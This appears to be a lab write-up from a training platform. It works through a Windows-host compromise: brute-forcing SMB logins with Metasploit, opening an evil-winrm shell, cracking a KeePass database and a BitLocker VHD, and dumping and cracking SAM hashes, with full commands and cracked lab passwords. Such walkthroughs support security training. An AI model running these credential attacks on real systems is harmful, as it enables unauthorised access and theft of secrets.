----

The next host is a Windows-based client. As with the previous assessments, our client would like to make sure that an attacker cannot gain access to any sensitive files in the event of a successful attack. While our colleagues were busy with other hosts on the network, we found out that the user **`Johanna`** is present on many hosts. However, we have not yet been able to determine the exact purpose or reason for this.

With this information I tried to determine the password of the user johanna.
I creadted a custom wordlist woth the provided mutation and password lists.

```shell
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

With this new list I brute-forced the smb service. 

```shell
msfconsole -q
search smb_login
use 0
set rhost <target>
set SMBUser johanna
set pass_list mut_password.list
set STOP_ON_SUCCESS true
run
```

```
[+] 10.129.91.222:445     - 10.129.91.222:445 - Success: '.\johanna:1231234!'
```

Now that we have a password, we can try to list the smb shares

```shell
smbclient -U johanna -L \\\\10.129.91.222\\
Password for [WORKGROUP\johanna]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        david           Disk      
        IPC$            IPC       Remote IPC

```

We did not have access to the david share. 
Next I checked if I can use evil-winrm with the credentials.

```shell
nxc winrm 10.129.91.222 -u johanna -p 1231234!
WINRM       10.129.91.222   5985   WINSRV           [*] Windows 10 / Server 2019 Build 17763 (name:WINSRV) (domain:WINSRV)
WINRM       10.129.91.222   5985   WINSRV           [+] WINSRV\johanna:1231234! (Pwn3d!)
```
This seems to work.

```shell
evil-winrm -i 10.129.91.222 -u johanna -p 1231234!
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\johanna\Documents> 
```

In the Documents folder there is a file called `Logins.kdbx`. This is a KeyPass file. I downloaded it and tried to crack the master key.

```shell
*Evil-WinRM* PS C:\Users\johanna\Documents> download Logins.kdbx /home/htb-ac-1473407/Desktop/logins.kdbx
                                                                                                                                                                                       
Info: Downloading C:\Users\johanna\Documents\Logins.kdbx to /home/htb-ac-1473407/Desktop/logins.kdbx
                                                                                           
Info: Download successful!            
```

```shell
keepass2john Logins.kdbx > keepasshash
john --wordlist=mut_password.list keepasshash
```
It worked after 5 mins

```shell
Qwerty7!         (logins)   
```

I logged into the KeePass with the master key I found and got the password from David

`david:gRzX7YbeTcDG7`

With these credential I could get access to the smb share called david. In this share, there was a ,vhd file. It was protected with bitlocket

```shell
bitlocker2john -i Backup.vhd > bitlockerhash
```

The password is:
```shell
123456789!       (?)   
```

Next I had to mount the vhd. I used the following guide: https://medium.com/@kartik.sharma522/mounting-bit-locker-encrypted-vhd-files-in-linux-4b3f543251f0

It had a SAM and SYSTEM hive which I dumped with secretsdump.py

```shell
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e53d4d912d96874e83429886c7bf22a1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9e73cc8353847cfce7b5f88061103b43:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:6ba6aae01bae3868d8bf31421d586153:::
david:1009:aad3b435b51404eeaad3b435b51404ee:b20d19ca5d5504a0c9ff7666fbe3ada5:::
johanna:1010:aad3b435b51404eeaad3b435b51404ee:0b8df7c13384227c017efc6db3913374:::
```

To crack the adminstrator hash, I used hashcat.

```shell
hashcat -m 1000 adminhash mut_password.list
```

It recoved the following password

`e53d4d912d96874e83429886c7bf22a1:Liverp00l8!`

Now I can RDP or WINRM with the administrator account and get the flag.
